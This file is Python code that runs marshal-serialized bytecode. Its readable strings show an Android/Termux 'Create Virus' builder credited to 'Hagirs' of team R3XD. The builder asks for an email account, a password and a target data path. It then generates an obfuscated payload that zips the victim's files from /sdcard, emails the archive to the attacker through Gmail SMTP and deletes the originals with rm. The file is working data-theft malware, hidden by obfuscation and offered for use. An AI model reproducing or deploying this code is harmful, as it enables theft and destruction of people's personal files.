import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00st\x00\x00\x00d\x00Z\x00d\x01d\x02l\x01Z\x01d\x01d\x03l\x02m\x02Z\x02\x01\x00d\x01d\x02l\x03Z\x03d\x01d\x02l\x04Z\x04e\x02\xa0\x05\xa1\x00Z\x05e\x05j\x06Z\x06e\x05j\x07Z\x08G\x00d\x04d\x05\x84\x00d\x05\x83\x02Z\td\x06Z\nd\x07Z\x0bd\x08Z\x0cd\tZ\rd\nZ\x0ed\x0bZ\x0fd\x0cd\r\x84\x00Z\x10e\x10\x83\x00\x01\x00d\x02S\x00)\x0ea\xab\x06\x00\x00\nos.system("pkg install zip")\nimport os\nimport smtplib\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom email.mime.base import MIMEBase\nfrom email import encoders\n\n\ndef send_mail_with_data(data):\n\tmail_content = "paket telah diambil bro :D silahkan cek"\n\tsender_address ="{}"\n\tsender_pass ="{}"\n\treceiver_address = sender_address\n\t\n\tmessage = MIMEMultipart()\n\tmessage[\'From\'] = sender_address\n\tmessage[\'To\'] = receiver_address\n\tmessage[\'Subject\'] = \'r3xdteam has sent data\'\n\n\tmessage.attach(MIMEText(mail_content, \'plain\'))\n\tattach_file_name = data\n\tattach_file = open(attach_file_name, \'rb\') # Open the file as binary mode\n\tpayload = MIMEBase(\'application\', \'octate-stream\')\n\tpayload.set_payload((attach_file).read())\n\tencoders.encode_base64(payload) #encode the attachment\n\tpayload.add_header(\'Content-Decomposition\', \'attachment\', filename=attach_file_name)\n\tmessage.attach(payload)\n\tsession = smtplib.SMTP(\'smtp.gmail.com\', 587) #use gmail with port\n\tsession.starttls() #enable security\n\tsession.login(sender_address, sender_pass) #login with mail_id and password\n\ttext = message.as_string()\n\tsession.sendmail(sender_address, receiver_address, text)\n\tsession.quit()\n\tos.system("rm {}")\n\tos.system("clear")\n\ta = input("Masukan Pesan : ")\n\tprint("You : ", a)\n\tos.system("clear")\n\tos.system("exit")\n\ndef saver():\n\tdata = "{}"\n\tos.system("clear")\n\tpush = "cd /sdcard/&&zip -r r3xd.zip "+data+"&&mv r3xd.zip r3xd"\n\tos.system(push)\n\tsaved = "/sdcard/r3xd/r3xd.zip"\n\tos.system("clear")\n\tsend_mail_with_data(saved)\n\n#prepare\ndef prep():\n\ttry:\n\t\tos.system("cd /sdcard/&&mkdir r3xd")\n\t\tos.system("clear")\n\t\tsaver()\n\texcept IOError:\n\t\tos.system("clear")\n\t\tsaver()\n\t\t\nprep()\n\xe9\x00\x00\x00\x00N)\x01\xda\x08datetimec\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00s$\x00\x00\x00e\x00Z\x01d\x00Z\x02d\x01d\x02\x84\x00Z\x03d\x03d\x04\x84\x00Z\x04d\x05d\x06\x84\x00Z\x05d\x07S\x00)\x08\xda\x05loginc\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00sT\x00\x00\x00z.|\x01|\x00_\x00|\x02|\x00_\x01|\x04|\x00_\x02|\x03|\x00_\x03t\x04\xa0\x05d\x01\xa1\x01\x01\x00t\x06d\x02\x83\x01\x01\x00W\x00n \x04\x00t\x07k\nrN\x01\x00\x01\x00\x01\x00t\x06t\x08d\x03t\t\x83\x03\x01\x00Y\x00n\x02X\x00d\x00S\x00)\x04N\xe9\x02\x00\x00\x00z"\x1b[32m[ SUCCESS ]\x1b[0m Email Login  \xfa\t[ ERROR ])\n\xda\x05ymail\xda\x05ypass\xda\x04data\xda\x04name\xda\x04time\xda\x05sleep\xda\x05print\xda\x07IOError\xda\x01R\xda\x01B)\x05\xda\x04selfr\x06\x00\x00\x00r\x07\x00\x00\x00r\t\x00\x00\x00r\x08\x00\x00\x00\xa9\x00r\x11\x00\x00\x00\xda\x00\xda\x08__init__Q\x00\x00\x00s\x12\x00\x00\x00\x00\x01\x02\x01\x06\x01\x06\x01\x06\x01\x06\x01\n\x01\x0c\x01\x0e\x01z\x0elogin.__init__c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00s\xc0\x00\x00\x00z\x96|\x00j\x00}\x01t\x01|\x01\x83\x01\xa0\x02\xa1\x00}\x02t\x03|\x02d\x01d\x02\x83\x03}\x03t\x04\xa0\x05|\x03\xa1\x01}\x04t\x01|\x01d\x03\x83\x02}\x05|\x05\xa0\x06d\x04\xa1\x01\x01\x00|\x05\xa0\x06d\x05t\x07|\x04\x83\x01\x17\x00d\x06\x17\x00\xa1\x01\x01\x00|\x05\xa0\x08\xa1\x00\x01\x00t\t\xa0\nd\x07\xa1\x01\x01\x00t\x0bd\x08\x83\x01\x01\x00t\x0bt\x0cd\t\x17\x00t\r\x17\x00t\x0e\xa0\x0f\xa1\x00\x17\x00d\n\x17\x00|\x00j\x00\x17\x00t\x10\x17\x00\x83\x01\x01\x00W\x00n$\x04\x00t\x11k\nr\xba\x01\x00\x01\x00\x01\x00t\x0bt\rd\x0b\x17\x00t\x10\x17\x00\x83\x01\x01\x00Y\x00n\x02X\x00d\x00S\x00)\x0cNr\x12\x00\x00\x00\xda\x04exec\xda\x01wz\x0fimport marshal\nz\x13exec(marshal.loads(z\x02))\xe9\x03\x00\x00\x00z"\x1b[32m[ SUCCESS ]\x1b[0m File Compiledz\x0c[  SAVED  ] \xfa\x01/r\x05\x00\x00\x00)\x12r\t\x00\x00\x00\xda\x04open\xda\x04read\xda\x07compile\xda\x07marshal\xda\x05dumps\xda\x05write\xda\x04repr\xda\x05closer\n\x00\x00\x00r\x0b\x00\x00\x00r\x0c\x00\x00\x00\xda\x01Gr\x0e\x00\x00\x00\xda\x02os\xda\x06getcwdr\x0f\x00\x00\x00r\r\x00\x00\x00)\x06r\x10\x00\x00\x00\xda\x01a\xda\x01x\xda\x01b\xda\x01c\xda\x01dr\x11\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00\xda\rfile_compiled\\\x00\x00\x00s\x1c\x00\x00\x00\x00\x01\x02\x01\x06\x01\x0c\x01\x0c\x01\n\x01\n\x01\n\x01\x16\x01\x08\x01\n\x01\x08\x01*\x01\x0e\x01z\x13login.file_compiledc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00sr\x00\x00\x00t\x00\xa0\x01|\x00j\x02|\x00j\x03|\x00j\x04|\x00j\x05\xa1\x04}\x01z4t\x06|\x00j\x04d\x01\x83\x02}\x02|\x02\xa0\x07|\x01\xa1\x01\x01\x00|\x02\xa0\x08\xa1\x00\x01\x00t\t\xa0\nd\x02\xa1\x01\x01\x00t\x0bd\x03\x83\x01\x01\x00W\x00n \x04\x00t\x0ck\nrl\x01\x00\x01\x00\x01\x00t\x0bt\rd\x04t\x0e\x83\x03\x01\x00Y\x00n\x02X\x00d\x00S\x00)\x05Nr\x15\x00\x00\x00r\x04\x00\x00\x00z!\x1b[32m[ SUCCESS ]\x1b[0m Create Virusr\x05\x00\x00\x00)\x0f\xda\x03scr\xda\x06formatr\x06\x00\x00\x00r\x07\x00\x00\x00r\t\x00\x00\x00r\x08\x00\x00\x00r\x18\x00\x00\x00r\x1d\x00\x00\x00r\x1f\x00\x00\x00r\n\x00\x00\x00r\x0b\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00)\x03r\x10\x00\x00\x00Z\x06script\xda\x01fr\x11\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00\xda\x0ccreate_virusl\x00\x00\x00s\x12\x00\x00\x00\x00\x01\x18\x01\x02\x01\x0c\x01\n\x01\x08\x01\n\x01\x0c\x01\x0e\x01z\x12login.create_virusN)\x06\xda\x08__name__\xda\n__module__\xda\x0c__qualname__r\x13\x00\x00\x00r(\x00\x00\x00r,\x00\x00\x00r\x11\x00\x00\x00r\x11\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00r\x03\x00\x00\x00P\x00\x00\x00s\x06\x00\x00\x00\x08\x01\x08\x0b\x08\x10r\x03\x00\x00\x00z\x05\x1b[32mz\x05\x1b[31mz\x05\x1b[33mz\x04\x1b[0mz\x04\x1b[1mae\x02\x00\x00\x1b[31m\x1b[1m\n          .\'\\   /`.            \n         .\'.-.`-\'.-.`.\n    ..._:   .-. .-.   :_...     \x1b[32m<-------------------------->\x1b[31m\n  .\'    \'-.(o ) (o ).-\'    `.   \x1b[32mCreated By : Hagirs\x1b[31m \n :  _    _ _`~(_)~`_ _    _  :  \x1b[32mWebsite    : r3xdteam.my.id\x1b[31m \n:  /:   \' .-=_   _=-. `   ;\\  : \x1b[32mBlog       : r3xd.xyz\x1b[31m \n:   :|-.._  \'     `  _..-|:   : \x1b[32mTeam       : R3XD\x1b[31m \n :   `:| |`:-:-.-:-:\'| |:\'   :  \x1b[32mVersion    : 0.0.1\x1b[31m \n  `.   `.| | | | | | |.\'   .\'  \x1b[32m<--------------------------->\x1b[31m\n    `.   `-:_| | |_:-\'   .\'\n      `-._   ````    _.-\'\n          ``-------\'\'        \nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x82\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03d\x02\x17\x00t\x04\x83\x02\x01\x00t\x02t\x05\x83\x01\x01\x00t\x02t\x03d\x02\x17\x00t\x04\x83\x02\x01\x00t\x06t\x07d\x03\x17\x00\x83\x01}\x00t\x06d\x04\x83\x01}\x01t\x06d\x05\x83\x01}\x02t\x06d\x06\x83\x01}\x03t\x02t\x03d\x02\x17\x00t\x04\x83\x02\x01\x00t\x08|\x00|\x01|\x02|\x03\x83\x04}\x04|\x04\xa0\t\xa1\x00\x01\x00|\x04\xa0\n\xa1\x00\x01\x00d\x00S\x00)\x07N\xda\x05clearz;-----------------------------------------------------------z\x0c[?] email : z\x0f[?] password : z\x0b[?] Name : z\x0b[?] Data : )\x0br!\x00\x00\x00\xda\x06systemr\x0c\x00\x00\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00\xda\x04logo\xda\x05inputr \x00\x00\x00r\x03\x00\x00\x00r,\x00\x00\x00r(\x00\x00\x00)\x05r$\x00\x00\x00\xda\x01y\xda\x01nr\'\x00\x00\x00r#\x00\x00\x00r\x11\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00\xda\x04menu\x8c\x00\x00\x00s\x18\x00\x00\x00\x00\x01\n\x01\x0e\x01\x08\x01\x0e\x01\x0c\x01\x08\x01\x08\x01\x08\x01\x0e\x03\x0e\x01\x08\x01r6\x00\x00\x00)\x11r)\x00\x00\x00r!\x00\x00\x00r\x02\x00\x00\x00r\n\x00\x00\x00r\x1b\x00\x00\x00Z\x03now\xda\x03minZ\x04hourZ\x03secr\x03\x00\x00\x00r \x00\x00\x00r\x0e\x00\x00\x00\xda\x01Yr\x0f\x00\x00\x00Z\x02BLr2\x00\x00\x00r6\x00\x00\x00r\x11\x00\x00\x00r\x11\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00\xda\x08<module>\x02\x00\x00\x00s \x00\x00\x00\x04C\x08\x01\x0c\x01\x08\x01\x08\x02\x08\x01\x06\x01\x06\x04\x0e\'\x04\x01\x04\x01\x04\x01\x04\x01\x04\x02\x04\x0f\x08\x10'))